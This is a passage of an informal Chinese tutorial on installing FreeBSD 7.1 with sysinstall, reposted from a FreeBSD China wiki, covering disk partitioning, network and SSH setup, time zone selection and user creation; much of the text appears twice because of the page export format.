name=\"第二十六步是否定制控制台设定\">第二十六步:是否定制控制台设定????</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/25-user_confirmation_requested-console_settions.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:25-user_confirmation_requested-console_settions.\njpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_25-user_confirmation_requested-console_settions.jpg\" /></a></p><p>[NO]</p><a name=\"第二十七步是否设置时区\">第二十七步:是否设置时区</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/26-user_confirmation_requested-set_time_zone.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:26-user_confirmation_requested-set_time_zone.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_26-user_confirmation_requested-set_time_zone.jpg\" /></a></p><p>[YES],这里我们将选择我们的时区，我们是中国北京时间</p><a name=\"第二十八步_选择_本地_或_utc_时间\">第二十八步：选择 本地  或 UTC 时间</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/27-select_clock.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:27-select_clock.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_27-select_clock.jpg\" /></a></p><p>这里我们选择[NO] 注： 世界协调时间(Universal Time Coordinated,UTC) <br />GPS  系统中有两种时间区分，一为UTC，另一为LT（地方时）两者的区别为时区不同，UTC就是0时区的时间，地方时为本地时间，如北京为早上八点（东八 区），UTC时间就为零点，时间比北京时晚八小时，以此计算即可</p><a name=\"第二十九步_选择所在洲\">第二十九步：选择所在洲</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/28-time_zone_selector.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:28-time_zone_selector.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_28-time_zone_selector.jpg\" /></a></p><p>[5 Asia] 我们选择亚洲,如果你不在亚洲的话，选择你所有的地区</p><a name=\"第三十步_选择国家或地区\">第三十步：选择国家或地区</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/29-countries_in_asia.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:29-countries_in_asia.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/29-countries_in_asia.jpg\" /></a></p><p>[9 China] 这里选择的有国家,也有地区,比如Hong Kong,是China的一部分,是一个地区</p><a name=\"第三十一步选择时区\">第三十一步:选择时区</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/30-china_time_zones.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:30-china_time_zones.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/30-china_time_zones.jpg\" /></a></p><p>我们中国大陆人民用的是 [1 east China - Beijin,Guangdong,Shanghai,etc .] 北京时间</p><a name=\"第三十二步选择是否使用短写模式的时间\">第三十二步:选择是否使用短写模 式的时间???</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/31-confirmation.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:31-confirmation.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/31-confirmation.jpg\" /></a></p><p>这个按自已的需要选择,YES表示使用短写的时间模式???</p><a name=\"第三十三步是否使用linux_binary_compatibility\">第三十三步:是否使用Linux binary  compatibility</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/32-user_confirmation_requested-linux_binary_compatibility.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:32-user_confirmation_requested-linux_binary_compatibility.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/32-user_confirmation_requested-linux_binary_compatibility.jpg\" /></a></p><p>由于…..(原因太多,我们就不一一例举了),所以我们要选择[YES],不然可能有部分Linux老爹生下的软件不能正常运行的</p><a name=\"第三十四步是否有ps2_serial_bus_的鼠标\">第 三十四步:是否有PS&#x2F;2,serial,bus 的鼠标？？</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/33-user_confirmation_requested-set_mouse.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:33-user_confirmation_requested-set_mouse.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/33-user_confirmation_requested-set_mouse.jpg\" /></a></p><p>[NO],偶们不用mouse了</p><a name=\"第三十五步_这个偶也不知道有啥作用_以前没有碰到过\">第 三十五步：这个偶也不知道有啥作用，以前没有碰到过</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/34-user_confirmation_requested-package.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:34-user_confirmation_requested-package.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/34-user_confirmation_requested-package.jpg\" /></a></p><p>偶是选择 [NO]，因为我也不知道是干嘛的，欢迎知道的来补充一下。</p><a name=\"第三十六步是否增加新用户\">第三十六步:是否增加新用户</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/35-user_confirmation_requested-add_user.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:35-user_confirmation_requested-add_user.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/35-user_confirmation_requested-add_user.jpg\" /></a></p><p>[YES]<br />这里我们要增加一用户，因为我们启用了SSH,而默认情况下Root帐号是不能远程登陆SSH,所以我们这里要增加个wheel组的用户,让它来进行 SSH远程登陆</p><a name=\"第三十七步用户和组管理界面\">第三十七步:用户和组管理界面</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/36-user_confirmation_requested-user_and_group_management.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:36-user_confirmation_requested-user_and_group_management.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/36-user_confirmation_requested-user_and_group_management.jpg\" /></a></p><p>[User]<br />这里我们增加个wheel组的用户</p><a name=\"第三十八步增加一用户\">第三十八步:增加一用户</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/37-user_confirmation_requested-user_and_group_management-add_user.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:37-user_confirmation_requested-user_and_group_management-add_user.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/37-user_confirmation_requested-user_and_group_management-add_user.jpg\" /></a></p><p>这里要注意,Group和Member  groups输入wheel,这个用户用来远程SSH登陆,切记切记,一定要设个密码,不然你的服务器就会变成公共场所了</p><a name=\"第三十九步退出用户管理\">第三十九步:退出用户管理</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/38-user_confirmation_requested-exit.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:38-user_confirmation_requested-exit.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/38-user_confirmation_requested-exit.jpg\" /></a></p><a name=\"第四十步提示信息\">第四十步:提示信息</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/39-message.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:39-message.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/39-message.jpg\" /></a></p><p>大意是:设置一个ROOT帐号的密码</p><a name=\"第四十一步设置root帐号的密码\">第四十一步:设置root帐号的密码</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/40-root_password.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:40-root_password.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/40-root_password.jpg\" /></a></p><p>一定要设的长一点哪,不过不要设完后自已也忘了密码 (偶就经常出这样的事故 -</em>-! )</p><a name=\"第四十二步不知道怎么翻译了\">第四十二步: ….. 不知道怎么翻译了</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/41-user_confirmation_requested-configuration_menu.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:41-user_confirmation_requested-configuration_menu.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/41-user_confirmation_requested-configuration_menu.jpg\" /></a></p><a name=\"第四十三步退出安装\">第四十三步:退出安装</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/42-exit_install.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:42-exit_install.jpg\"><img src=\"http://wiki.freebsdchina.org/_me\ndia/howto/i/42-exit_install.jpg\" /></a></p><p>选择[X Exit Instll]我们退出安装</p><a name=\"最后一步重启\">最后一步:重启</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/43-remve_cd.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:43-remve_cd.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/43-remve_cd.jpg\" /></a></p><p>这里要注意,一定要拿出光盘,后再选择[YES],切记切记</p><p>OK全文结束，累死我家毛驴了</p></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a name=\"freebsd_安装教程\">FreeBSD 安装教程</a><p>本文以安装 FreeBSD 7.1 (i386) 为示范</p><p>转载来源：<a href=\"http://wiki.freebsdchina.org/howto/i/installbsd\">http://wiki.freebsdchina.org/howto/i/installbsd</a></p><p>帮助英语不好的朋友和初学FessDSB的朋友们</p><p>本人其实也是刚开始学用FreeBSD的菜鸟,由于时间空闲,所以想为FreeBSD尽点微薄之力,下文中可能有大量的错误,请老鸟们指正,免得让我误人 子弟.</p><a name=\"freebsd_的下载\">FreeBSD 的下载</a><p>大家可以到 <a href=\"http://www.freebsdchina.org/\" title=\"http://www.freebsdchina.org\" rel=\"nofollow\">http://www.freebsdchina.org</a>  的首页上选择下载,如果只是mini安装的话,只需下载 Disk1 (第一张光盘)就足够了 下载中大家可能看到有  i386和amd64两种版本，i386是32位的操作系统，amd64是64位的操作系统，amd64并不是表示只能使用在amd公司产的64位的系统 上，Intel的相关x86架构上的64位系统也可以使用。 （希望了解相关知识的老鸟们补充一下相关的知识） <a href=\"http://wiki.freebsdchina.org/howto/a/amd64_list\" title=\"howto:a:amd64_list\">支持 FreeBSD amd64 的CPU例表</a></p><a name=\"基本安装过程\">基本安装过程</a><p>OK,让我们开始FreeBSD之旅,直接敲回车,开始安装.</p><a name=\"第一步_选择启动模式\">第一步：选择启动模式</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/0-welcome_to_freebsd.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:0-welcome_to_freebsd.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_0-welcome_to_freebsd.jpg\" /></a></p><p>上图的内容为； <br />1.启动FreeBSD [默认选项] <br />2.启动FreeBSD，禁用ACPI <br />3.安全模式启动FreeBSD <br />4.单用户模式启动FreeBSD <br />5……..偶也不知道 verbose loggin是啥 <img src=\"/images/pic/other_site/wiki_freebsdchina_icon_sad.gif\" alt=\":-(\" /> <br />6.进入启动指令模式（翻译的可能有点问题）<br />7.重启</p><a name=\"第二步_选择国家\">第二步：选择国家</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/1-country_selection.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:1-country_selection.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_1-country_selection.jpg\" /></a></p><p>我们当然是选择China了，如果选择呢，只要使用上下移动键就可以上下移动(我总感觉这句像废话)。移动键在我们键盘的最右手边的一排小键盘的左边，那 四个单独在一起的键，如果你分不清左右的话，我建议你还是拿根绳子自已找棵树吧</p><p>有的朋友可能要问，我已经选好了[China]了，怎么选择 [OK] 或 [Cancel]  呢，只需要按[Tab]键就行了，就可以在两者之间切换，如果你以前不知道，多按几下就明白了，光标会移动到你要进行操作的项目上去的。OK,如果你现在 会了,并能举一反三了,那说明你的智商至少70分以上</p><a name=\"第三步选择键盘类型\">第三步:选择键盘类型</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/2-system_conole_keymap.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:2-system_conole_keymap.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_2-system_conole_keymap.jpg\" /></a></p><p>我们选择[USA <acronym title=\"International Organization for Standardization\">ISO</acronym>]  美式标准键盘</p><a name=\"第四步_进入安装菜单\">第四步：进入安装菜单</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/3-sysinatall_main_menu.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:3-sysinatall_main_menu.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_3-sysinatall_main_menu.jpg\" /></a></p><p>我们选择[Standard]进行安装，如果你想了解更多的关于sysinstall Main Menu的信息请点击<a href=\"http://wiki.freebsdchina.org/howto/i/install/s/sysinstall_main_menu\" title=\"howto:i:install:s:sysinstall_main_menu\" rel=\"nofollow\">sysinstall_main_menu</a></p><a name=\"第五步提示信息\">第五步:提示信息</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/4-message.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:4-message.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_4-message.jpg\" /></a></p><p>翻译如下:xxxxx…..English Good的过来帮忙翻译一下 <img src=\"/images/pic/other_site/wiki_freebsdchina_icon_cool.gif\" alt=\"8-)\" /></p><a name=\"第六步硬盘分区\">第六步:硬盘分区</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/5-fdisk_partition_editor.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:5-fdisk_partition_editor.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_5-fdisk_partition_editor.jpg\" /></a></p><p>这里,我们选择[A],键盘上按一下a键,表示使用全部硬盘空间,做完所有操作后,要退出此界面,只需按一下q键,就退出,并进入下一步</p><p>如果你想了解更多的此界面包含的信息，请点击这里<a href=\"http://wiki.freebsdchina.org/howto/i/install/f/fdisk_partition_editor\" title=\"howto:i:install:f:fdisk_partition_editor\" rel=\"nofollow\">fdisk_partition_editor</a></p><a name=\"第七步_启动模式\">第七步：启动模式</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/6-install_boot_manager_for_drive_ad0.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:6-install_boot_manager_for_drive_ad0.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_6-install_boot_manager_for_drive_ad0.jpg\" /></a></p><p>选择[Standard]，直接使用MBR启动 <br />BootMgr,使用FreeBSD的启动管理，如果你要安装其它操作系统，使用此项 <br />Standard 直接使用MBR模式，不使用启动管理器，如果你一个硬盘只使用FreeBSD一个操作系统的话，使用此项</p><a name=\"第八步提示信息\">第八步:提示信息</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/7-message.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:7-message.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_7-message.jpg\" /></a></p><p>翻译如下:xxxxx…..English Good的过来帮忙翻译一下 <img src=\"/images/pic/other_site/wiki_freebsdchina_icon_cool.gif\" alt=\"8-)\" /></p><a name=\"第九步_分区标签_这里不知道怎么翻译_硬盘标签\">第九步：分 区标签？？（这里不知道怎么翻译，硬盘标签？？）</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/8-freebsd_disklabel_editor.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:8-freebsd_disklabel_editor.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_8-freebsd_disklabel_editor.jpg\" /></a></p><p>OK，我们现在要对使用的硬盘空间进行….不知道怎么说了，分区吧，就当成分区吧 -<em>-!</p><p>当我们选定(利用上下移动键) [Disk: ad0 Partition name:ad0s1 Free: XXX blocks (xxx <acronym title=\"Megabyte\">MB</acronym>)]之后，可以使用a键进行自动配置，如果全部操作完成，需要退出此界面，进入下一步，按 q键，退出</p><p>如果你想了解更多的此界面包含的信息，请点击这里<a href=\"http://wiki.freebsdchina.org/howto/i/install/d/disklabel_editor\" title=\"howto:i:install:d:disklabel_editor\" rel=\"nofollow\">disklabel_editor</a></p><a name=\"第十步choose_distributions_谁为帮忙翻译一下吧\">第十步:Choose Distributions  (谁为帮忙翻译一下吧)</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/9-choose_distributions.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:9-choose_distributions.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_9-choose_distributions.jpg\" /></a></p><p>我们这里选择[Minmal]进行最小化安装.</p><p>如果你想了解更多的此界面包含的信息，请点击这里<a href=\"http://wiki.freebsdchina.org/howto/i/install/c/choose_distributions\" title=\"howto:i:install:c:choose_distributions\" rel=\"nofollow\">choose_distributions</a></p><a name=\"第十一步_选择从哪里安装\">第十一步：选择从哪里安装</a><p><a href=\"http://wiki.freebsdchina.org/_\ndetail/howto/i/10-choose_installation_media.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:10-choose_installation_media.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_10-choose_installation_media.jpg\" /></a></p><p>1. CD&#x2F;DVD 从CD&#x2F;DVD上安装<br />2. <acronym title=\"File Transfer Protocol\">FTP</acronym>  从FTP服务器进行安装,如果你的网速够快的话，可以从官方Ftp网站进行网络安装<br />3. <acronym title=\"File Transfer Protocol\">FTP</acronym>  透过防火墙从FTP服务器进行安装<br />4. <acronym title=\"Hyper Text Transfer Protocol\">HTTP</acronym>  通过http代理服务器从FTP服务器进行安装,这里还是从FTP服务器安装，只是使用了HTTP代理<br />5. DOS 从一个DOS分区进行安装<br />6. NFS 通过 NFS进行安装？？<br />7. File System 偶也不是很明白<br />8. Floppy 从软盘进行安装。<br />9. Tape 从磁带机上进行安装</p><p>我们当然是选择 [CD&#x2F;DVD] 了</p><a name=\"第十二步警告提示信息\">第十二步:警告提示信息</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/11-user_confirmation_requested.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:11-user_confirmation_requested.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_11-user_confirmation_requested.jpg\" /></a></p><p>选择[YES]<br />以上内容翻译如下:……..</p><a name=\"第十三步提示信息\">第十三步:提示信息</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/12-message.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:12-message.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_12-message.jpg\" /></a></p><p>以上内容翻译如下:……..</p><a name=\"第十四步网络配置\">第十四步:网络配置</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/13-user_confirmation_requested-configure_ethernet.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:13-user_confirmation_requested-configure_ethernet.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_13-user_confirmation_requested-configure_ethernet.jpg\" /></a></p><p>选择[YES]，我们进行网络配置</p><a name=\"第十五步选择网络接口\">第十五步:选择网络接口</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/14-network_interface_information_required.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:14-network_interface_information_required.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_14-network_interface_information_required.jpg\" /></a></p><p>em0 是我的网卡，你的网卡可能是其它，如果被FreeBSD识别出来的话，第一项就是配置网卡<br />plip0 <br />sl0 <br />ppp0 <br />sl0 <br />ppp0</p><p>我们进行网卡设置。选择[em0],注意，你的可能是其它值</p><a name=\"第十六步是否使用ipv6\">第十六步:是否使用IPv6</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/15-user_confirmation_requested-ipv6.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:15-user_confirmation_requested-ipv6.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_15-user_confirmation_requested-ipv6.jpg\" /></a></p><p>选择[NO],我也很想用哪,可现在的网络不支持哪</p><a name=\"第十七步_是否使用_dhcp_来获得网络配置\">第十七步：是否 使用 DHCP 来获得网络配置</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/16-user_confirmation_requested-dhcp.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:16-user_confirmation_requested-dhcp.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_16-user_confirmation_requested-dhcp.jpg\" /></a></p><p>选择[NO]  (因为我的网络没有DHCP服务器)</p><a name=\"第十八步_网卡配置\">第十八步：网卡配置</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/17-network_configuration.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:17-network_configuration.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_17-network_configuration.jpg\" /></a></p><p>Host:你的这台主机的名称，你可以填你想要的名称<br />Domain:这里填写你的域名（如果你没有域名的话，我也不知道填什么，知道的兄弟请告诉一下）<br />IPv4 Gateway:网关IP<br />Name Server:名称服务器（你的DNS服务器）<br />IPv4 Address：此机的IP地址，这个你自已设定了<br />NetMask: 子网掩码，这个要问一下你的网络管理员，如果是254台机器的常见的局域网的话，就是255.255.255.0<br />Extra options to ifconfig: 偶也不知道这里填什么，反正空着就是了</p><a name=\"第十九步是否现在启用网络接口\">第十九步:是否现在启用网络接口</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/18-user_confirmation_requested-bring_interface.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:18-user_confirmation_requested-bring_interface.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_18-user_confirmation_requested-bring_interface.png\" /></a></p><p>选择[YES],上面的图示错了,要选[YES]</p><a name=\"第二十步是否做为网关\">第二十步:是否做为网关</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/19-user_confirmation_requested-gateway.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:19-user_confirmation_requested-gateway.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_19-user_confirmation_requested-gateway.png\" /></a></p><p>选择[NO]</p><a name=\"第二十一步是否设置inetd的配置\">第二十一步:是否设置inetd的配 置</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/20-user_confirmation_requested-configure_inetd.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:20-user_confirmation_requested-configure_inetd.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_20-user_confirmation_requested-configure_inetd.png\" /></a></p><p>选择[NO],这个是用来配置inetd的,相当于WINDOWS里控制面板里的 [服务]</p><a name=\"第二十三步是否启用ssh\">第二十三步:是否启用SSH</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/21-user_confirmation_requested-ssh.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:21-user_confirmation_requested-ssh.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_21-user_confirmation_requested-ssh.png\" /></a></p><p>选择[YES]，因为我们要用SSH来远程控制服务器（大家都是懒人，免得老是往机房里跑了,受辐射不说，还瘦上两斤肉）</p><a name=\"第二十三步是否启用_ftp_服务\">第二十三步:是否启用 FTP 服务</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/22-user_confirmation_requested-ftp.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:22-user_confirmation_requested-ftp.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_22-user_confirmation_requested-ftp.png\" /></a></p><p>选择[NO],如果你要开启FTP服务器的话,选择YES</p><a name=\"第二十四步是启做为nfs服务器\">第二十四步:是启做为NFS服务器</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/23-user_confirmation_requested-nfs_server.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:23-user_confirmation_requested-nfs_server.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_23-user_confirmation_requested-nfs_server.png\" /></a></p><p>选择[NO],偶们不想要它做为NFS 服务器</p><a name=\"第二十五步是否启用nfs客户端功能\">第二十五步:是否启用NFS客户端功 能</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/24-user_confirmation_requested-nfs_client.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:24-user_confirmation_requested-nfs_client.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_24-user_confirmation_requested-nfs_client.jpg\" /></a></p><p>偶们还是选择[NO]</p><a name=\"第二十六步是否定制控制台设定\">第二十六步:是否定制控制台设定????</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/25-user_confirmation_requested-console_settions.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:25-user_confirmation_requested-console_settions.\njpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_25-user_confirmation_requested-console_settions.jpg\" /></a></p><p>[NO]</p><a name=\"第二十七步是否设置时区\">第二十七步:是否设置时区</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/26-user_confirmation_requested-set_time_zone.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:26-user_confirmation_requested-set_time_zone.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_26-user_confirmation_requested-set_time_zone.jpg\" /></a></p><p>[YES],这里我们将选择我们的时区，我们是中国北京时间</p><a name=\"第二十八步_选择_本地_或_utc_时间\">第二十八步：选择 本地  或 UTC 时间</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/27-select_clock.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:27-select_clock.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_27-select_clock.jpg\" /></a></p><p>这里我们选择[NO] 注： 世界协调时间(Universal Time Coordinated,UTC) <br />GPS  系统中有两种时间区分，一为UTC，另一为LT（地方时）两者的区别为时区不同，UTC就是0时区的时间，地方时为本地时间，如北京为早上八点（东八 区），UTC时间就为零点，时间比北京时晚八小时，以此计算即可</p><a name=\"第二十九步_选择所在洲\">第二十九步：选择所在洲</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/28-time_zone_selector.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:28-time_zone_selector.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_28-time_zone_selector.jpg\" /></a></p><p>[5 Asia] 我们选择亚洲,如果你不在亚洲的话，选择你所有的地区</p><a name=\"第三十步_选择国家或地区\">第三十步：选择国家或地区</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/29-countries_in_asia.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:29-countries_in_asia.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/29-countries_in_asia.jpg\" /></a></p><p>[9 China] 这里选择的有国家,也有地区,比如Hong Kong,是China的一部分,是一个地区</p><a name=\"第三十一步选择时区\">第三十一步:选择时区</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/30-china_time_zones.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:30-china_time_zones.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/30-china_time_zones.jpg\" /></a></p><p>我们中国大陆人民用的是 [1 east China - Beijin,Guangdong,Shanghai,etc .] 北京时间</p><a name=\"第三十二步选择是否使用短写模式的时间\">第三十二步:选择是否使用短写模 式的时间???</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/31-confirmation.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:31-confirmation.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/31-confirmation.jpg\" /></a></p><p>这个按自已的需要选择,YES表示使用短写的时间模式???</p><a name=\"第三十三步是否使用linux_binary_compatibility\">第三十三步:是否使用Linux binary  compatibility</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/32-user_confirmation_requested-linux_binary_compatibility.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:32-user_confirmation_requested-linux_binary_compatibility.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/32-user_confirmation_requested-linux_binary_compatibility.jpg\" /></a></p><p>由于…..(原因太多,我们就不一一例举了),所以我们要选择[YES],不然可能有部分Linux老爹生下的软件不能正常运行的</p><a name=\"第三十四步是否有ps2_serial_bus_的鼠标\">第 三十四步:是否有PS&#x2F;2,serial,bus 的鼠标？？</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/33-user_confirmation_requested-set_mouse.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:33-user_confirmation_requested-set_mouse.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/33-user_confirmation_requested-set_mouse.jpg\" /></a></p><p>[NO],偶们不用mouse了</p><a name=\"第三十五步_这个偶也不知道有啥作用_以前没有碰到过\">第 三十五步：这个偶也不知道有啥作用，以前没有碰到过</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/34-user_confirmation_requested-package.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:34-user_confirmation_requested-package.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/34-user_confirmation_requested-package.jpg\" /></a></p><p>偶是选择 [NO]，因为我也不知道是干嘛的，欢迎知道的来补充一下。</p><a name=\"第三十六步是否增加新用户\">第三十六步:是否增加新用户</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/35-user_confirmation_requested-add_user.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:35-user_confirmation_requested-add_user.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/35-user_confirmation_requested-add_user.jpg\" /></a></p><p>[YES]<br />这里我们要增加一用户，因为我们启用了SSH,而默认情况下Root帐号是不能远程登陆SSH,所以我们这里要增加个wheel组的用户,让它来进行 SSH远程登陆</p><a name=\"第三十七步用户和组管理界面\">第三十七步:用户和组管理界面</a><p><a 